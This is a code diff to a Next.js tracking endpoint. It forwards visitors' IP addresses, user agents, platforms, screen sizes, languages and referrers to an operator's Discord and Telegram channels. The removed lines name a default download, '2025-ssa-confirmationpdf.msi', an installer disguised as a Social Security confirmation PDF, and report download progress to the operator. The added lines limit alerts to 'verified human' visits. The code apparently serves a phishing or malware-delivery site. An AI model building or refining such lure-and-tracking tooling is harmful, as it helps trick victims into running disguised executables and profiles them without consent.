@@ -55,19 +55,21 @@ export async function POST(request: NextRequest) {
             securityCheck = await checkIP(ip, apiKey);
         }
 
-        const message = formatMessage(data, ip, securityCheck);
+        if (data.event === 'Page Visit - Verified Human') {
+            const message = formatMessage(data, ip);
 
-        const promises = [];
+            const promises = [];
 
-        if (process.env.DISCORD_WEBHOOK_URL) {
-            promises.push(sendToDiscord(message));
+            if (process.env.DISCORD_WEBHOOK_URL) {
+                promises.push(sendToDiscord(message));
+            }
+
+            if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
+                promises.push(sendToTelegram(message));
+            }
+
+            await Promise.allSettled(promises);
         }
-
-        if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
-            promises.push(sendToTelegram(message));
-        }
-
-        await Promise.allSettled(promises);
 
         return NextResponse.json({ 
             success: true,
@@ -82,29 +84,14 @@ export async function POST(request: NextRequest) {
     }
 }
 
-function formatMessage(data: TrackingData, ip: string, security: SecurityCheckResult | null): string {
-    const fileName = process.env.DOWNLOAD_FILE_PATH || '2025-ssa-confirmationpdf.msi';
-    
-    let eventText = data.event;
-    if (data.event === 'Download Started') {
-        eventText = `Your ${fileName} has started downloading`;
-    } else if (data.event === 'Download Completed' || data.event === 'Download Complete') {
-        eventText = `Your ${fileName} has finished downloading`;
-    }
-    
-    let message = `🔔 **${eventText}**\n\n`;
-    
-    message += `📅 Time: ${data.timestamp || new Date().toISOString()}\n`;
+function formatMessage(data: TrackingData, ip: string): string {
+    let message = `📅 Time: ${data.timestamp || new Date().toISOString()}\n`;
     message += `🌐 IP: ${ip}\n`;
     message += `💻 User Agent: ${data.userAgent || 'Unknown'}\n`;
     message += `📱 Platform: ${data.platform || 'Unknown'}\n`;
     message += `🖥️ Screen: ${data.screenResolution || 'Unknown'}\n`;
     message += `🌍 Language: ${data.language || 'Unknown'}\n`;
     message += `🔗 Referrer: ${data.referrer || 'Direct'}`;
-
-    if (security) {
-        message += '\n' + formatSecurityMessage(security);
-    }
 
     return message;
 }
